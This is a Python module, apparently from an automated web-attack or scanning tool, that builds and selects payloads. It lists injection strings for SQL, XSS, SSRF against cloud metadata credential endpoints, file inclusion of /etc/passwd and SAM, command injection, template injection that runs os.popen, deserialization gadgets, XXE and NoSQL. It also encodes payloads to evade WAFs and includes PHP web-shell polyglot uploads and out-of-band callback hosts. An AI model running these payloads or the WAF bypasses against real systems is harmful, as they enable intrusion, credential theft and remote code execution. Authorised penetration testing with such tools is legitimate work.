"""Static payload library, encoding engine, and context-aware payload selection."""

from __future__ import annotations

import base64
import json
import random
from typing import Any, Dict, List, Optional


class PayloadForge:
    def __init__(self):
        self._waf_signatures = self._load_waf_signatures()

    def get_waf_bypass_payloads(self, base_payloads: List[str], waf: str = "unknown") -> List[str]:
        bypassed = []
        for payload in base_payloads:
            bypassed.extend(self._apply_waf_bypasses(payload, waf))
        return list(dict.fromkeys(bypassed))[:30]

    def get_encoded_payloads(self, payload: str, encoding: str = "all") -> List[str]:
        encodings = [encoding] if encoding != "all" else ["url_double", "url_unicode", "base64", "hex", "mixed", "html_entity"]
        result = []
        for enc in encodings:
            try:
                result.append(self._encode(payload, enc))
            except Exception:
                continue
        return result

    def get_context_payloads(self, attack_type: str, context: Dict[str, Any]) -> List[str]:
        location = context.get("location", "query")
        tech_stack = context.get("fingerprint", {}).get("technologies", [])
        if attack_type == "sqli":
            return self._get_sqli_context(location, "", [], tech_stack)
        elif attack_type == "xss":
            return self._get_xss_context(location, "", [], tech_stack)
        elif attack_type == "ssrf":
            return self._get_ssrf_context(location, "", [], tech_stack)
        elif attack_type == "lfi":
            return self._get_lfi_context(location, "", [], tech_stack)
        elif attack_type == "rce":
            return self._get_rce_context(location, "", [], tech_stack)
        elif attack_type == "ssti":
            return self._get_ssti_context(location, "", [], tech_stack)
        elif attack_type == "nosqli":
            return self._get_nosqli_context(location, "", [], tech_stack)
        elif attack_type == "xxe":
            return self._get_xxe_context(location, "", [], tech_stack)
        elif attack_type == "crypto":
            return self._get_crypto_context(location, "", [], tech_stack)
        elif attack_type == "deser":
            return self._get_deser_context(location, "", [], tech_stack)
        elif attack_type == "race":
            return self._get_race_context(location, "", [], tech_stack)
        elif attack_type == "smuggling":
            return self._get_smuggling_context(location, "", [], tech_stack)
        elif attack_type == "graphql":
            return self._get_graphql_context(location, "", [], tech_stack)
        return []

    def get_polyglot_uploads(self, file_type: str = "all") -> List[Dict[str, Any]]:
        if file_type == "all":
            return self._polyglot_uploads
        return [p for p in self._polyglot_uploads if file_type in p.get("types", [])]

    def get_oob_callbacks(self, count: int = 5) -> List[str]:
        return random.sample(self._oob_domains, min(count, len(self._oob_domains)))

    def detect_waf(self, headers: Dict[str, str], body: str, status: int) -> Optional[str]:
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.lower() if body else ""
        for waf, signatures in self._waf_signatures.items():
            for sig_type, sigs in signatures.items():
                for sig in sigs:
                    if sig_type == "header":
                        for hk, hv in headers_lower.items():
                            if sig in hv:
                                return waf
                    elif sig_type == "body":
                        if sig in body_lower:
                            return waf
                    elif sig_type == "status":
                        if status == sig:
                            return waf
        return None

    def _apply_waf_bypasses(self, payload: str, waf: str) -> List[str]:
        bypasses = [payload]
        bypasses.append(payload.replace(" ", "/**/"))
        bypasses.append(payload.replace(" ", "%09"))
        bypasses.append(payload.replace(" ", "%0a"))
        bypasses.append(payload.replace("'", "''"))
        bypasses.append(payload.replace("'", "`"))
        bypasses.append(payload.replace("'", "%27"))
        bypasses.append(payload.replace('"', "%22"))
        bypasses.append(payload.replace("(", "%28"))
        bypasses.append(payload.replace(")", "%29"))
        bypasses.append(payload.upper())
        bypasses.append(payload.lower())
        bypasses.append(self._toggle_case(payload))
        if waf in ("cloudflare", "mod_security"):
            bypasses.append(self._encode(payload, "url_double"))
            bypasses.append(self._encode(payload, "mixed"))
        if waf in ("akamai", "imperva"):
            bypasses.append(self._encode(payload, "base64"))
            bypasses.append(self._encode(payload, "hex"))
        return list(dict.fromkeys(bypasses))

    def _encode(self, payload: str, encoding: str) -> str:
        if encoding == "url_double":
            from urllib.parse import quote
            return quote(quote(payload, safe=""))
        elif encoding == "url_unicode":
            return "".join(f"%u{ord(c):04x}" if ord(c) > 127 else c for c in payload)
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "mixed":
            result = ""
            for i, char in enumerate(payload):
                if i % 3 == 0:
                    result += f"%{ord(char):02x}"
                elif i % 3 == 1:
                    result += char.upper() if char.islower() else char.lower()
                else:
                    result += char
            return result
        elif encoding == "html_entity":
            return "".join(f"&#x{ord(c):x};" if ord(c) > 127 else c for c in payload)
        return payload

    def _toggle_case(self, payload: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    def _get_sqli_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        # Generic & Auth bypass
        base = [
            "' OR 1=1--", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            '" OR 1=1--', '" OR "1"="1', '" OR "1"="1"--', '" OR "1"="1"/*',
            "admin'--", "admin' #", "admin'/*", "admin' or '1'='1",
            "1' OR '1'='1", "1 OR 1=1", "1' OR 1=1--", "1) OR 1=1--", "1') OR ('1'='1--",
            # UNION-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            '" UNION SELECT NULL--', '" UNION SELECT NULL,NULL--', '" UNION SELECT NULL,NULL,NULL--',
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--", "' AND 1=CAST(version() AS int)--",
            "' AND extractvalue(1, concat(0x7e, version()))--", "' AND updatexml(1, concat(0x7e, version()), 1)--",
            # Order By / Structural
            "1 ORDER BY 1--", "1 ORDER BY 5--", "1 ORDER BY 10--", "1 ORDER BY 20--",
            # Stacked queries & Boolean
            "'; SELECT 1--", "1; SELECT 1--", "1 AND 1=1", "1 AND 1=2",
            "' AND '1'='1", "' AND '1'='2",
        ]
        # PostgreSQL dialect
        if not tech_stack or "PostgreSQL" in tech_stack or "generic" in tech_stack:
            base.extend([
                "' AND pg_sleep(3)--", "1' AND pg_sleep(3)--", "'; SELECT pg_sleep(3)--",
                "' OR pg_sleep(3)--", "1 AND (SELECT 1 FROM (SELECT pg_sleep(3))x)--",
                "'||(SELECT '' FROM pg_sleep(3))||'", "CAST(1 AS int)",
            ])
        # MySQL / MariaDB dialect
        if not tech_stack or "MySQL" in tech_stack or "MariaDB" in tech_stack or "generic" in tech_stack:
            base.extend([
                "' AND SLEEP(3)--", "1' AND SLEEP(3)--", "'; SELECT SLEEP(3)--",
                "' OR SLEEP(3)--", "1 AND (SELECT 1 FROM (SELECT SLEEP(3))x)--",
                "' AND BENCHMARK(5000000, MD5('x'))--", "1' AND BENCHMARK(5000000, MD5('x'))--",
            ])
        # MSSQL dialect
        if not tech_stack or "MSSQL" in tech_stack or "ASP.NET" in tech_stack or "generic" in tech_stack:
            base.extend([
                "'; WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:3'--",
                "'; WAITFOR DELAY '0:0:3'/*", "' WAITFOR DELAY '0:0:3'--",
            ])
        # SQLite dialect
        if not tech_stack or "SQLite" in tech_stack or "generic" in tech_stack:
            base.extend([
                "' AND (SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) x, (SELECT 1 UNION SELECT 2) y)--",
                "' AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(50000000/2))))--",
                "' UNION SELECT sqlite_version()--",
            ])
        # Oracle dialect
        if not tech_stack or "Oracle" in tech_stack or "generic" in tech_stack:
            base.extend([
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
                "' UNION SELECT NULL FROM DUAL--",
                "' UNION SELECT banner FROM v$version--",
            ])
        return list(dict.fromkeys(base))

    def _get_xss_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # HTML tag context
            "<script>alert(1)</script>",
            "<script src=data:,alert(1)></script>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=this.src='data:,';alert(1)>",
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg id=x onfocus=alert(1) tabindex=1>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            # Attribute context breakouts
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            "'>><script>alert(1)</script>",
            "' onfocus=alert(1) autofocus='",
            '" onfocus=alert(1) autofocus="',
            '" onmouseover=alert(1) id="',
            # Script & JS string context breakouts
            "';alert(1);//",
            '";alert(1);//',
            "-alert(1)-",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "\\';alert(1);//",
            # Template literals
            "${alert(1)}",
            "`-alert(1)-`",
            # Protocol / URI context
            "javascript:alert(1)",
            "javascript:alert(document.domain)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            # Angular / Vue CSTI
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{7*7}}",
        ]
        return list(dict.fromkeys(base))

    def _get_ssrf_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # AWS & OpenStack IMDS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            # GCP Metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
            # Azure Metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/v1.json",
            # Localhost & Loopback encodings
            "http://127.0.0.1:80", "http://127.0.0.1:22", "http://127.0.0.1:8080", "http://127.0.0.1:5000",
            "http://localhost:80", "http://localhost:22", "http://localhost:8080",
            "http://0.0.0.0:80", "http://0:80", "http://127.1:80",
            "http://[::]:80", "http://[::1]:80", "http://[0000::1]:80",
            "http://2130706433:80",  # Decimal IP for 127.0.0.1
            "http://0x7f.0x0.0x0.0x1",  # Hex IP
            "http://0177.0.0.01",  # Octal IP
            "http://127.0.0.1.nip.io", "http://localtest.me",
            # Local file & alternative schemes
            "file:///etc/passwd", "file:///c:/windows/win.ini",
            "dict://127.0.0.1:11211/",
            "gopher://127.0.0.1:6379/_INFO",
        ]
        return list(dict.fromkeys(base))

    def _get_lfi_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # Linux Standard
            "../../../../etc/passwd", "../../../../../etc/passwd", "../../../../../../etc/passwd",
            "../../../../etc/hosts", "/etc/passwd", "/etc/hosts",
            "../../../../proc/self/environ", "/proc/self/environ",
            "../../../../proc/self/cmdline", "/proc/self/cmdline",
            # Traversal Bypasses
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            # Windows Standard & Paths
            "../../../../windows/win.ini", "C:\\windows\\win.ini", "C:/windows/win.ini",
            "../../../../windows/system.ini", "C:\\windows\\system.ini",
            "../../../../windows/system32/drivers/etc/hosts", "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../boot.ini", "../../../../system32/config/sam",
            # PHP Wrappers & Filters
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            # Null-byte (legacy systems)
            "../../../../etc/passwd\x00", "../../../../etc/passwd%00",
        ]
        return list(dict.fromkeys(base))

    def _get_rce_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # Unix command separators
            "; id", "| id", "&& id", "|| id", "`id`", "$(id)", "\n id \n",
            "; whoami", "| whoami", "&& whoami", "|| whoami", "`whoami`", "$(whoami)", "\n whoami \n",
            "; cat /etc/passwd", "| cat /etc/passwd", "`cat /etc/passwd`", "$(cat /etc/passwd)",
            # Blind delay commands (POSIX & Windows)
            "; sleep 4", "| sleep 4", "`sleep 4`", "$(sleep 4)", "&& sleep 4",
            "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
            "| ping -n 3 127.0.0.1", "& ping -n 3 127.0.0.1",
            "; timeout 4", "| timeout /t 4",
            # Windows command separators
            "&& dir", "|| dir", "& dir", "| dir",
            "& type C:\\windows\\win.ini", "| type C:\\windows\\win.ini",
            # OOB Triggers
            "; curl http://127.0.0.1:80", "; nslookup 127.0.0.1",
        ]
        return list(dict.fromkeys(base))

    def _get_ssti_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # Arithmetic discriminators (Jinja2, Twig, Freemarker, Smarty, Mako)
            "{{777*777}}", "{{7*'7'}}", "{{7*7}}", "${777*777}", "${7*7}",
            "#{777*777}", "#{7*7}", "<%= 777*777 %>", "<%= 7*7 %>",
            "{777*777}", "{7*7}",
            # Jinja2 / Python escapes
            "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # Twig / PHP escapes
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{_self.env.setCache('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+')}}",
            # Freemarker / Java escapes
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "[#assign ex=\"freemarker.template.utility.Execute\"?new()][#assign r=ex(\"id\") /]${r}",
            # Smarty escapes
            "{php}echo `id`;{/php}",
            "{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET[\"cmd\"]);?>',Smarty::$_smarty_vars)}",
            # Spring EL / Java
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.Math).min(777,777)}",
            # Velocity
            "#set($x=777*777)$x",
            # Mako
            "<%! import os %>${os.popen('id').read()}",
        ]
        return list(dict.fromkeys(base))

    def _get_nosqli_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # JSON-based operators
            '{"$ne": null}', '{"$ne": ""}', '{"$ne": 0}', '{"$ne": 1}',
            '{"$gt": ""}', '{"$gt": 0}', '{"$gte": ""}',
            '{"$exists": true}', '{"$in": ["admin", "root", "user"]}',
            '{"$regex": ".*"}', '{"$regex": "^admin"}',
            '{"$where": "1 == 1"}', '{"$where": "this.password.match(/.*/)"}',
            # String / URL-encoded injections
            "[$ne]=null", "[$ne]=1", "[$gt]=", "[$regex]=.*", "[$exists]=true",
            "admin' || '1'=='1", "admin' || ''=='",
            "admin' && this.password.match(/.*/)//",
            "1' || 1==1//",
        ]
        return list(dict.fromkeys(base))

    def _get_xxe_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
            '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>',
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        ]
        return list(dict.fromkeys(base))

    def _get_crypto_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            "test", "admin", "null", "undefined", "AAAA",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",  # 32-byte block
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",  # 64-byte block
            # Padding oracle bit flips
            "\x00" * 16, "\xff" * 16,
            "0000000000000000", "ffffffffffffffff",
        ]
        return list(dict.fromkeys(base))

    def _get_deser_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = [
            # PHP Serialization
            'O:4:"Test":0:{}', 'a:1:{s:4:"test";s:4:"test";}',
            'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
            # Python Pickle Base64
            'gASVFAAAAAAAAACMBHRlc3SFlC4=',  # 'test'
            'cos\nsystem\n(S"id"\ntR.',      # os.system('id')
            # Java Serialized Objects
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlme0AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==',
            # Node.js Serialized Objects
            '{"rce":"_$$ND_FUNC$$_function (){return require(\'child_process\').execSync(\'id\').toString();}()"}',
        ]
        return list(dict.fromkeys(base))

    def _get_race_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["1", "2", "0", "-1", "100", "9999999", "0.01", "-0.01"]

    def _get_smuggling_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return [
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://localhost",
            "http://[::1]",
        ]

    def _get_graphql_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return [
            '{ __schema { types { name fields { name type { name kind } } } } }',
            '{ __schema { queryType { name fields { name } } mutationType { name fields { name } } } }',
            '{ users { id email password token role } }',
            '{ accounts { id balance user { email } } }',
            'query { user(id: 1) { id email role } }',
        ]

    def _load_waf_signatures(self) -> Dict[str, Any]:
        return {
            "cloudflare": {
                "header": ["cf-ray", "cloudflare", "cf-cache-status"],
                "body": ["cloudflare", "checking your browser", "ray id:", "attention required! | cloudflare"],
                "status": [403, 503],
            },
            "akamai": {
                "header": ["akamai", "x-akamai-transformed"],
                "body": ["access denied", "you don't have permission to access", "akamaighost"],
                "status": [403],
            },
            "imperva": {
                "header": ["x-cdn", "incap-ses", "visid_incap"],
                "body": ["incapsula", "incident id", "powered by imperva"],
                "status": [403],
            },
            "mod_security": {
                "header": ["mod_security", "modsecurity"],
                "body": ["mod_security", "not acceptable", "modsecurity action"],
                "status": [403, 406],
            },
            "aws_waf": {
                "header": ["awswaf", "x-amzn-requestid"],
                "body": ["403 forbidden", "request blocked by aws waf"],
                "status": [403],
            },
        }

    _polyglot_uploads = [
        {"filename": "shell.php.jpg", "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>", "content_type": "image/jpeg", "types": ["php", "image"]},
        {"filename": "shell.svg", "content": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "content_type": "image/svg+xml", "types": ["svg", "xss"]},
    ]

    _oob_domains = [
        "http://burp-collaborator.net", "http://oastify.com", "http://interactsh.com",
        "http://canarytokens.com", "http://requestbin.net", "http://webhook.site",
    ]
